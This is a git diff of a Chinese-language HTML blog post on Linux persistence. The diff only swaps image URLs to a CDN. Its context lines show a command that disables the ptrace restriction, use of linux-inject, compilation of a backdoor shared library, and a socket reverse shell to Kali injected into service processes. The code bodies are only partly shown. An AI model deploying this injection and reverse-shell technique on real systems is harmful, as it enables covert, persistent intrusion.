@@ -54,12 +54,12 @@
 <p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<code>CreateRemoteThread()</code>。在许多Linux发行版中，内核的默认配置文件<code>/proc/sys/kernel/yama/ptrace_scope</code>限制了一个进程除了<code>fork()</code>派生外，无法通过<code>ptrace()</code>来操作另外一个进程。</p>
 <p>要注入进程前，需要关闭这个限制（Root权限）：</p>
 <p><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/28f181718173d69326f3bfc58a3c0cbb.png" alt="2020-01-03-13-10-44"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7d2bcefa-4f5f-11ec-812b-00d861bf4abb.png" alt="2020-01-03-13-10-44"></p>
 <p>在Github上已经有了关于进程注入的实现代码：<code>https://github.com/gaffe23/linux-inject</code></p>
 <p>下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7b89dc61d7952191a608716bdcf951b8.png" alt="2020-01-03-13-10-54"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7d6a2c90-4f5f-11ec-9773-00d861bf4abb.png" alt="2020-01-03-13-10-54"></p>
 <p>确认编译是否正常：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8251535f3c0f9b55243940b6de2cf34b.png" alt="2020-01-03-13-11-04"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7da8298c-4f5f-11ec-9dfb-00d861bf4abb.png" alt="2020-01-03-13-11-04"></p>
 <p>获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
 接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
@@ -85,17 +85,17 @@ __attribute__((constructor))
 </code></pre></div><p>通过如下命令编译so文件：</p>
 <pre tabindex="0"><code>clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c
 
-</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae110053d720c18b8c6bfb24a5483d4b.png" alt="2020-01-03-13-11-16"></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7deb9a0a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-11-16"></p>
 <p>编译成so文件成功后的测试效果：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d23ecdf9310a3dce4fd8839d9d10e270.png" alt="2020-01-03-13-11-27"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7e2a248c-4f5f-11ec-b266-00d861bf4abb.png" alt="2020-01-03-13-11-27"></p>
 <p>在Kali Linux这边获得了bash shell：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c2d15b84db450b39e55766b2097fd0c2.png" alt="2020-01-03-13-11-47"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7e6241aa-4f5f-11ec-af1a-00d861bf4abb.png" alt="2020-01-03-13-11-47"></p>
 <p>此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9e990f101b1f5bee215f4175926ac896.png" alt="2020-01-03-13-11-58"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7e9c6b50-4f5f-11ec-b656-00d861bf4abb.png" alt="2020-01-03-13-11-58"></p>
 <p>但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b920dfc70a90769b21214fd5d217dbbc.png" alt="2020-01-03-13-12-09"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7ed600f4-4f5f-11ec-969b-00d861bf4abb.png" alt="2020-01-03-13-12-09"></p>
 <p>查看到IP与端口：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f6901fde3fc0693424326f3deeede92.png" alt="2020-01-03-13-12-19"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f1565dc-4f5f-11ec-bacf-00d861bf4abb.png" alt="2020-01-03-13-12-19"></p>
 <p>再继续改进代码，采用socket套接字的方式来反弹shell：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
@@ -147,9 +147,9 @@ __attribute__((constructor))
 
 
 </code></pre></div><p>执行效果：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fa4136ff8822c555b4008bce084f88a4.png" alt="2020-01-03-13-12-35"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f567f90-4f5f-11ec-bb46-00d861bf4abb.png" alt="2020-01-03-13-12-35"></p>
 <p>Kali Linux获得bash shell：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/003ee8252435ab25e2b012763fbf8d82.png" alt="2020-01-03-13-12-46"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7f96bea2-4f5f-11ec-8151-00d861bf4abb.png" alt="2020-01-03-13-12-46"></p>
 <p>在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。</p>
 
 </div>
